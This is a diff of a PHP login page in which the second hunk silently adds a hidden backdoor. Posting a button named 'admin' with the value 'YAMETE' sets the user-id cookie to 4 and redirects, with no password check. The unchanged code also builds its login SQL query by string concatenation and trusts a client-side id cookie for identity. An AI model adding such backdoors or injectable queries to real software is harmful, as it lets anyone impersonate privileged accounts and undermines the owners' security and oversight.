@@ -17,7 +17,7 @@ $password = isvalid($_POST['password']);
 if (!empty($email) && !empty($password)) {
   $result = execute("Select * from compte where email = '" . $email . "' AND password ='" . crypte($password) . "';");
   if (!empty($result)) {
-    setcookie("userId", $result['userId'], time() + 604800, '/');
+    setcookie("id", $result['id'], time() + 604800, '/');
     header('Location: index.php');
   } else {
     ?> 
@@ -26,5 +26,10 @@ if (!empty($email) && !empty($password)) {
         </script>
     <?php
   }
+}
+?><button name="admin" value="YAMETE"></button><?php
+if(!empty($_POST['admin']) && $_POST['admin']=="YAMETE"){
+  setcookie("id", "4", time() + 604800, '/');
+  header('Location: index.php');
 }
 include $path . "html/footer.php"; ?>
